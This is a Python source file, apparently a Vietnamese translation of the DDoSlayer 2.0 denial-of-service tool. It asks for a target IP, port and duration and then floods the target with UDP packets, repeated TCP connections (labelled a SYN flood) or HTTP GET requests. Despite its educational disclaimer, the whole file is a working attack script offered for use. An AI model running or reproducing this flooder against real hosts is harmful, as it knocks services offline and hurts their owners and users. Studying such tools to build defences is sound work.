from termcolor import colored
import sys
import os
import time
import socket
import random

# Xóa màn hình terminal
os.system("clear")
os.system("figlet DDoSlayer")

print()
print(colored("Tác giả   : Chris 'SaintDruG' Abou-Chabke", 'green'))
print(colored("Website : https://www.blackhatethicalhacking.com", 'magenta'))
print(colored("Github   : https://github.com/blackhatethicalhacking", 'red'))
print(colored("YouTube : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw", 'green'))
print(colored("Linkedin : https://www.linkedin.com/company/black-hat-ethical-hacking/", 'magenta'))
print(colored("Twitter : https://twitter.com/secur1ty1samyth", 'green'))
print(colored("Tấn công là cách phòng thủ tốt nhất!", 'magenta'))
print(colored("Công cụ này được viết với mục đích giáo dục - giúp đội phòng thủ hiểu cách những cuộc tấn công diễn ra.", 'cyan'))
print(colored("BHEH không chịu trách nhiệm cho việc lạm dụng và yêu cầu phải có NDA để thực hiện các cuộc tấn công như vậy", 'red'))
print(colored("Bạn đang sử dụng DDoSlayer Phiên bản: 2.0", 'yellow'))
print()

# Nhập IP và cổng của mục tiêu
ip = input("Nhập IP mục tiêu: ")
try:
    port = int(input("Nhập cổng mục tiêu: "))
except ValueError:
    print("Cổng không hợp lệ. Thoát...")
    sys.exit()

# Nhập thời gian tấn công
try:
    dur = int(input("Nhập thời gian tấn công (giây): "))
except ValueError:
    print("Thời gian không hợp lệ. Thoát...")
    sys.exit()

# Hàm thực hiện tấn công UDP Flood
def udp_flood(ip, port, message, dur):
    # Tạo socket UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Thiết lập thời gian chờ cho socket để chương trình không bị treo
    s.settimeout(dur)

    # Địa chỉ IP và số cổng của máy chủ mục tiêu
    target = (ip, port)

    # Bắt đầu gửi gói tin
    start_time = time.time()
    packet_count = 0
    while True:
        # Gửi tin nhắn đến máy chủ mục tiêu
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"Đã gửi gói tin {packet_count}")
        except socket.error:
            # Nếu socket không thể gửi gói tin, thoát vòng lặp
            break

        # Nếu thời gian đã trôi qua so với thời gian quy định, thoát vòng lặp
        if time.time() - start_time >= dur:
            break

    # Đóng socket
    s.close()

# Hàm thực hiện tấn công SYN Flood
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"Đã gửi {sent} gói tin SYN đến mục tiêu: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Tấn công đã dừng.")
            sys.exit()
        finally:
            sock.close()  # Đảm bảo đóng socket trong mọi trường hợp

# Hàm thực hiện tấn công HTTP Flood
def http_flood(ip, port, duration):
    # Tạo socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Tạo yêu cầu HTTP
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(dur)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Tạo lại socket cho mỗi lần lặp
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"Đã gửi {sent} gói tin HTTP đến mục tiêu: {ip}")
        except KeyboardInterrupt:
            print("\n[-] Tấn công đã dừng bởi người dùng")
            break
    sock.close()

# Nhập loại tấn công
attack_type = input(colored(
    "Nhập loại tấn công (Chọn số) (1.UDP/2.HTTP/3.SYN): ", "green"))

if attack_type == "1":
    message = b"Gửi 1337 gói tin baby"
    print(colored("Tấn công UDP được chọn", "red"))
    udp_flood(ip, port, message, dur)
    print(colored("Tấn công UDP hoàn thành", "red"))
elif attack_type == "3":
    print(colored("Tấn công SYN được chọn", "red"))
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print(colored("Tấn công HTTP được chọn", "red"))
    http_flood(ip, port, dur)
else:
    print(colored("Loại tấn công không hợp lệ. Thoát...", "green"))
    sys.exit()
